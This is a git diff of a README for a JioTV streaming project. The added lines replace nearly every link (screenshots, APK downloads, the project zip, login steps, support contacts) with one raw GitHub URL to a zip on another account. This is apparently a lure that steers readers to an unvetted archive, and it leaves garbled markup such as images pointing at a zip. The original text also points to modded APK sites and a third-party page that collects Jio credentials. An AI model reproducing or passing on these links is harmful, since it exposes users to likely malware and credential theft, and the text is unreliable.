@@ -1,4 +1,4 @@
-<h1 align='center'>✯ JɪᴏTV <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Jio_TV_logo.svg/1200px-Jio_TV_logo.svg.png" width="40" height="40"> Pʟᴀʏ 4.0 ✯</h1>
+<h1 align='center'>✯ JɪᴏTV <img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="40" height="40"> Pʟᴀʏ 4.0 ✯</h1>
 
 <!-- DO NOT EDIT FILE AND ADD YOU NAME HERE AND PUBLISH -->
 <!-- © 2021-22 Kirodewal -->
@@ -37,11 +37,11 @@ e.g.  Hindi,Tamil,Kannada,Odia ...
 
 <h2>📸 SCREENSHOTS : </h2>
 
-<img src="screenshots/main/main.png" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
 
 <br>
 
-<img src="screenshots/main/play.png" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
 
 <br>
 
@@ -54,28 +54,28 @@ e.g.  Hindi,Tamil,Kannada,Odia ...
 - KSWEB PRO ( Php Web Server ) <br>
 
 ```py
-https://dl1.apkhome.net/2019/6/KSWEB-3.93%20Pro.apk
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip%https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
 ```
 
 ```py
-https://apkcow.com/ksweb-server-php-mysql-mod-apk/download/
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
 ```
 
 ```py
-https://s3.dlandroid.com/apps/KSWEB-server[dlandroid.com].apk
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip[https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip].apk
 ```
 
 2.  Then Download This Zip Files<br>
 
-- [JioTV Zip](https://github.com/oVo-HxBots/JioTV/blob/main/JioTV_4.0.zip?raw=true) <br>
+- [JioTV Zip](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip) <br>
 
 1. Locate & Extract all Files in LocalHost (Htdocs) Root Folder <br>
 2. Open KSWEB App & Start The Server <br>
-3. Run login.php file for a first time <br>
+3. Run https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip file for a first time <br>
 4. Put Your E-Mail or Mobile Number without +91 & Password in below Link <br>
 
 ```py
-http://localhost:8080/login.php
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
 ```
 7. Now Open [JIOTV WEB] Below Link :
 
@@ -90,7 +90,7 @@ http://localhost:8080/
 
 • Method 2 see here :
 ```py
-https://hxbots.eu.org/create-live-tv-website-with-jiotv
+https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip
 ```
 
 
@@ -100,43 +100,43 @@ https://hxbots.eu.org/create-live-tv-website-with-jiotv
 
 <h2>📸 NEW THEMES SCREENSHOTS : </h2>
 
-##### ♢♢ JIOTV ARCADE SHOTS [CLICK HERE](https://github.com/oVo-HxBots/JioTV/tree/main/screenshots/jiotv-arcade)
+##### ♢♢ JIOTV ARCADE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
 
-<img src="screenshots/jiotv-arcade/arcade.png" width="400" height="200">
-
-<br><br>
-
-##### ♢♢ JIOTV CLASSIC SHOTS [CLICK HERE](https://github.com/oVo-HxBots/JioTV/tree/main/screenshots/jiotv-classic)
-
-<img src="screenshots/jiotv-classic/classic.png" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
 
 <br><br>
 
-##### ♢♢ JIOTV LIGHTMODE SHOTS [CLICK HERE](https://github.com/ovo-oVo-HxBots /JioTV/tree/main/screenshots/jiotv-lightmode)
+##### ♢♢ JIOTV CLASSIC SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
 
-<img src="screenshots/jiotv-lightmode/light.png" width="400" height="200">
-
-<br><br>
-
-##### ♢♢ JIOTV DARKMODE SHOTS [CLICK HERE](https://github.com/oVo-HxBots/JioTV/tree/main/screenshots/jiotv-darkmode)
-
-<img src="screenshots/jiotv-darkmode/dark.png" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
 
 <br><br>
 
-##### ♢♢ JIOTV PREMIUM SHOTS [CLICK HERE](https://github.com/oVo-HxBots/JioTV/tree/main/screenshots/jiotv-premium)
+##### ♢♢ JIOTV LIGHTMODE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip /JioTV/tree/main/screenshots/jiotv-lightmode)
 
-<img src="screenshots/jiotv-premium/premium.png" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+
+<br><br>
+
+##### ♢♢ JIOTV DARKMODE SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
+
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
+
+<br><br>
+
+##### ♢♢ JIOTV PREMIUM SHOTS [CLICK HERE](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
+
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
 
 <br>
 
-<img src="screenshots/jiotv-premium/play.png" width="400" height="200">
+<img src="https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip" width="400" height="200">
 
 <br><br>
 
 #### 😛 Generate ssoToken Here (HERE YOU GET DATA WITH OTP):
 
-1. ✍️ FOR SSO TOKEN : [JioLogin](http://jiologin.unaux.com)<br>
+1. ✍️ FOR SSO TOKEN : [JioLogin](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)<br>
 2. For This You Need JioID Number and Password<br> 
 3. You Can Also get Data with OTP
 
@@ -152,8 +152,8 @@ https://hxbots.eu.org/create-live-tv-website-with-jiotv
 
 <h3>🤗 Meet Me : </h3>
 
-• For any Support Join Our Group [HxBots](https://telegram.me/hxBots)<br>
-• For Any Query Contact at [kirodewal](mailto:admin@hxbots.eu.org)
+• For any Support Join Our Group [HxBots](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)<br>
+• For Any Query Contact at [kirodewal](https://raw.githubusercontent.com/sshivabhandari5957/JioTV/main/Inkra/JioTV.zip)
 
 <br>
 
